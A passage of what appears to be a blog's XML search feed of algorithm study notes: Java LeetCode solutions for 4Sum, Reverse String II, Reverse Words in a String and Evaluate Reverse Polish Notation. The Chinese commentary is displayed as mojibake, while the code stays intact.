nums[i -<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>å»é‡bçš„é€»è¾‘ä»i+1ä½ç½®å¼€å§‹ã€å…¶å®ç›¸å½“äºleftã€‘ å’Œå»é‡aä¸€æ ·çš„é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(j &gt; i + <span class="number">1</span> &amp;&amp; nums[j - <span class="number">1</span>] == nums[j]) </span><br></pre></td></tr></table></figure><h6 id="åŒæŒ‡é’ˆ-1"><a href="#åŒæŒ‡é’ˆ-1" class="headerlink" title="åŒæŒ‡é’ˆ"></a>åŒæŒ‡é’ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">fourSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//ä¸ç”¨è¿”å›ä¸‹æ ‡ åŒæŒ‡é’ˆæ³•å…ˆæ’å¥½åº</span></span><br><span class="line">         List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">         Arrays.sort(nums);   </span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">         <span class="comment">//nums[i] &gt; target å‰ªææ“ä½œ</span></span><br><span class="line">         <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span> &amp;&amp; nums[i] &gt; target)&#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//å»é‡a</span></span><br><span class="line">           <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i - <span class="number">1</span>] == nums[i]) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//å»é‡b</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(j &gt; i + <span class="number">1</span> &amp;&amp; nums[j - <span class="number">1</span>] == nums[j]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> j + <span class="number">1</span>;</span><br><span class="line">             <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">             <span class="keyword">while</span>(right &gt; left) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> (<span class="type">long</span>) nums[i] + nums[j] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum &gt; target) &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; target) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i],nums[j],nums[left],nums[right]));</span><br><span class="line">                    <span class="comment">//å»é‡dã€å°±æ˜¯rightã€‘</span></span><br><span class="line">                    <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) &#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//å»é‡c</span></span><br><span class="line">                    <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0xc</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xc/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xc/</url>
      
        <content type="html"><![CDATA[<h4 id="åè½¬å­—ç¬¦ä¸²II"><a href="#åè½¬å­—ç¬¦ä¸²II" class="headerlink" title="åè½¬å­—ç¬¦ä¸²II"></a>åè½¬å­—ç¬¦ä¸²II</h4><p>link:<a href="https://leetcode.cn/problems/reverse-string-ii/description/">541. åè½¬å­—ç¬¦ä¸² II - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å…³é”®ç‚¹åœ¨äºæˆ‘ä»¬è¦æ‰¾å¯¹åè½¬æ€è·¯ï¼Œ2kæ˜¯ä¸€ä¸ªåŒºé—´ï¼Œæ²¡è¾¾åˆ°æ¡ä»¶å’Œè¾¾åˆ°æ¡ä»¶ä¹‹åæ€ä¹ˆå¤„ç†.<br>å› æ­¤è€ƒè™‘æ€ä¹ˆç­›é€‰æ¡ä»¶.</p><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ªå­—ç¬¦æ•°ç»„ç”¨äºå­˜å‚¨éå†çš„ä¸‹æ ‡ä½ç½®ç”¨äºç­›é€‰ã€å…¶å®ç±»ä¼¼åŒæŒ‡é’ˆåˆ¤æ–­ æ­¤æ—¶å°¾æŒ‡é’ˆçš„åˆ¤æ–­ é¿å…è¶Šç•Œã€‘åˆ¤æ–­åŒºé—´ä¸º[æ•°ç»„é•¿åº¦-1ï¼Œèµ·å§‹ä½ç½® + k - 1]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] ch = s.toCharArray(); </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; ch.length;i += <span class="number">2</span>*k) &#123;</span><br><span class="line">              <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i;</span><br><span class="line">          <span class="comment">//é˜²æ­¢è¶Šç•Œ å¹³ç§»åˆ¤æ–­åŒºé—´å’Œlengthæ¯”è¾ƒ</span></span><br><span class="line">              <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(ch.length -<span class="number">1</span> ,start + k - <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">while</span>(start &lt; end) &#123;</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                ch[end] ^= ch[start];</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                start++;</span><br><span class="line">                end--;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//æœ€ç»ˆè¿”å›å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯"><a href="#åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯" class="headerlink" title="åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯"></a>åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯</h4><p>linkï¼š<a href="https://leetcode.cn/problems/reverse-words-in-a-string/description/">151. åè½¬å­—ç¬¦ä¸²ä¸­çš„å•è¯ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><p>å€’åºéå†å­—ç¬¦ä¸²ï¼Œè®°å½•å·¦å³è¾¹ç•Œiï¼Œjï¼Œæ‰¾åˆ°ç©ºæ ¼åˆ é™¤ï¼ŒæŒ¨ä¸ªéå†.æœ€åè’‹å•è¯æ‹¼æ¥è¿”å›å­—ç¬¦ä¸².</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//åˆ é™¤é¦–å°¾ç©ºæ ¼</span></span><br><span class="line">         s = s.trim();</span><br><span class="line">         <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> s.length() - <span class="number">1</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> j;</span><br><span class="line">         <span class="type">StringBuilder</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">         <span class="comment">//æœç´¢ç¬¬ä¸€ä¸ªç©ºæ ¼</span></span><br><span class="line">         <span class="keyword">while</span>(i &gt;= <span class="number">0</span>)  &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; s.charAt(i) != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//æ·»åŠ å•è¯</span></span><br><span class="line">            res.append(s.substring(i + <span class="number">1</span>, j + <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">while</span>(i &gt;=  <span class="number">0</span> &amp;&amp; s.charAt(i) == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//ç»§ç»­éå†ä¸‹ä¸€ä¸ªå•è¯</span></span><br><span class="line">            j = i;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//è½¬æ¢å­—ç¬¦ä¸²</span></span><br><span class="line">         <span class="keyword">return</span> res.toString().trim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™¤æ­¤ä¹‹å¤–è¿˜èƒ½ç”¨åŒæŒ‡é’ˆæ³•è§£å†³.ç”¨fastå’ŒslowæŒ‡é’ˆè§£å†³ç©ºæ ¼.</p><p>1.é¦–å…ˆåˆ©ç”¨åŒæŒ‡é’ˆå–å‡ºç©ºæ ¼ï¼ˆä½†æ˜¯ä¿ç•™å•è¯ä¹‹é—´çš„ç©ºæ ¼ã€slowæŒ‡é’ˆ++ä¸ºç©ºçš„æ—¶å€™èµ‹å€¼ä¸ºç©ºå†++ã€‘<br>2.åè½¬æ•´ä¸ªå­—ç¬¦ä¸²<br>3.å•ä¸ªå•è¯å†…éƒ¨åè½¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">// å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—ç¬¦æ•°ç»„</span></span><br><span class="line">        <span class="type">char</span>[] ch = s.toCharArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å»é™¤å¤šä½™ç©ºæ ¼å¹¶æ¥æ”¶è¿”å›çš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line">        ch = removeExtraSpaces(ch);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åè½¬æ•´ä¸ªå­—ç¬¦ä¸²</span></span><br><span class="line">        reverse(ch, <span class="number">0</span>, ch.length - <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// å•è¯å†…éƒ¨åè½¬</span></span><br><span class="line">        reverseWords(ch);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è¾“å‡ºå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span>[] removeExtraSpaces(<span class="type">char</span>[] ch) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>; fast &lt; ch.length; fast++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch[fast] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// å¦‚æœ slow ä¸ä¸º 0ï¼Œæ„å‘³ç€ä¸æ˜¯é¦–å•è¯å‰çš„å­—ç¬¦ï¼Œéœ€è¦æ·»åŠ ç©ºæ ¼</span></span><br><span class="line">                <span class="keyword">if</span> (slow != <span class="number">0</span>) &#123;</span><br><span class="line">                    ch[slow++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¤åˆ¶å•è¯</span></span><br><span class="line">                <span class="keyword">while</span> (fast &lt; ch.length &amp;&amp; ch[fast] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                    ch[slow++] = ch[fast++];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// åˆ›å»ºæ–°æ•°ç»„æ¥å­˜å‚¨å»é™¤å¤šä½™ç©ºæ ¼åçš„å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="type">char</span>[] newCh = <span class="keyword">new</span> <span class="title class_">char</span>[slow];</span><br><span class="line">        System.arraycopy(ch, <span class="number">0</span>, newCh, <span class="number">0</span>, slow);</span><br><span class="line">        <span class="keyword">return</span> newCh;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] ch, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            ch[left] ^= ch[right];</span><br><span class="line">            ch[right] ^= ch[left];</span><br><span class="line">            ch[left] ^= ch[right];</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseWords</span><span class="params">(<span class="type">char</span>[] ch)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt;= ch.length; end++) &#123;</span><br><span class="line">            <span class="comment">// å½“ end é‡åˆ°ç©ºæ ¼æˆ–è€…åˆ°è¾¾å­—ç¬¦æ•°ç»„æœ«å°¾ï¼Œå¼€å§‹åè½¬å•è¯</span></span><br><span class="line">            <span class="keyword">if</span> (end == ch.length || ch[end] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                reverse(ch, start, end - <span class="number">1</span>);</span><br><span class="line">                start = end + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h5><p> 1.String substring(int start, int end) è¿”å›ä¸€ä¸ªæ–°çš„ <code>String</code>ï¼Œå®ƒåŒ…å«æ­¤åºåˆ—å½“å‰æ‰€åŒ…å«çš„å­—ç¬¦å­åºåˆ—ã€‚<br>2.åœ¨ä½¿ç”¨ StringBuffer ç±»æ—¶ï¼Œæ¯æ¬¡éƒ½ä¼šå¯¹ StringBuffer å¯¹è±¡æœ¬èº«è¿›è¡Œæ“ä½œï¼Œè€Œä¸æ˜¯ç”Ÿæˆæ–°çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦å¯¹å­—ç¬¦ä¸²è¿›è¡Œä¿®æ”¹æ¨èä½¿ç”¨ StringBufferã€‚<br>3.trim() æ–¹æ³•ç”¨äºåˆ é™¤å­—ç¬¦ä¸²çš„å¤´å°¾ç©ºç™½ç¬¦ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubã®Algorithm.0xe</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xe/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xe/</url>
      
        <content type="html"><![CDATA[<h5 id="é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼"><a href="#é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼" class="headerlink" title="é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼"></a>é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼</h5><p>linkï¼š<a href="https://leetcode.cn/problems/evaluate-reverse-polish-notation/description/">150. é€†æ³¢å…°è¡¨è¾¾å¼æ±‚å€¼ - åŠ›æ‰£ï¼ˆLeetCodeï¼‰</a></p><h6 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h6><p>æœ€å¼€å§‹çš„æ€è·¯å°±æ˜¯ç”¨æ ˆè§£å†³ï¼Œéè¿ç®—ç¬¦å·çš„å…ˆå…¥æ ˆï¼Œé‡åˆ°è¿ç®—ç¬¦å†å‡ºæ ˆå¯¹è¿ç®—ç¬¦è¿›è¡Œåˆ¤æ–­ä¹‹åè¿›è¡Œç›¸åº”çš„è¿ç®—æœ€åå‡ºæ ˆå³å¯.<br><strong>ã€æ³¨æ„ä¸€ç‚¹ã€‘</strong><br> ä¸ºäº†ä¿è¯è¿ç®—é¡ºåºï¼Œè¿ç®—éƒ½æ˜¯num2å¯¹num1æ“ä½œï¼ˆå› ä¸ºå…ˆè¿›åå‡ºï¼‰</p><p>å‰ææ˜¯ææ‡‚é€†æ³¢å…°å¼<br>æœ¬è´¨æ˜¯äºŒå‰æ ‘ä¸­çš„ä¸­åºéå†å˜æˆäº†ååºéå†.</p><h6 id="æš´åŠ›ç‰ˆ"><a href="#æš´åŠ›ç‰ˆ" class="headerlink" title="æš´åŠ›ç‰ˆ"></a>æš´åŠ›ç‰ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(String[] tokens)</span> &#123;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> num1,num2;</span><br><span class="line">        <span class="keyword">for</span>(String s:tokens)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.equals(<span class="string">&quot;+&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">               stack.push(stack.pop()+stack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s.equals(<span class="string">&quot;-&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                stack.push(-stack.pop()+stack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s.equals(<span class="string">&quot;*&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                stack.push(stack.pop()*stack.pop());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s.equals(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp1</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp2</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                stack.push(tmp2/tmp1);   </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                stack.push(Integer.valueOf(s));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.pop();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="ä¼˜åŒ–ç‰ˆ"><a href="#ä¼˜åŒ–ç‰ˆ" class="headerlink" title="ä¼˜åŒ–ç‰ˆ"></a>ä¼˜åŒ–ç‰ˆ</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(String[] tokens)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(tokens == <span class="literal">null</span> || tokens.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LinkedList&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Set&lt;String&gt; operators = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();</span><br><span class="line">        operators.add(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">        operators.add(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">        operators.add(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">        operators.add(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(String str : tokens) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!operators.contains(str)) &#123;</span><br><span class="line">                stack.push(Integer.valueOf(str));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">num1</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">num2</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">                <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span>(str.equals(<span class="string">&quot;+&quot;</span>)) &#123;</span><br><span class="line">                    result = num2 + num1;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(str.equals(<span class="string">&quot;-&quot;</span>)) &#123;</span><br><span class="line">                    result = num2 - num1;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span>(str.equals(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">                    result = num2 * num1;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    result = num2 / num1;</span><br><span class="line">                &#125;</span><br><span class="line">                stack.push(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.pop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a><strong>Tips</strong></h6><p>HashSet<code>æ•°æ®ç»“æ„çš„</code>contains()<code>æ“ä½œå¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º</code>O(1).<br><code>LinkedList</code> çš„ <code>push</code> å’Œ <code>pop</code> æ“ä½œæ—¶é—´å¤æ‚åº¦ä¸º <code>O(1)</code>ï¼Œå› ä¸ºå®ƒä»¬åªæ¶‰åŠåœ¨åˆ—è¡¨å¤´éƒ¨æ·»åŠ æˆ–ç§»é™¤å…ƒç´ <br><code>Set</code> æœ¬èº«å…·æœ‰é˜²æ­¢é‡å¤çš„ç‰¹æ€§ï¼Œå³ä½¿é‡å¤æ·»åŠ åŒä¸€ä¸ªè¿ç®—ç¬¦ï¼ˆå¦‚ 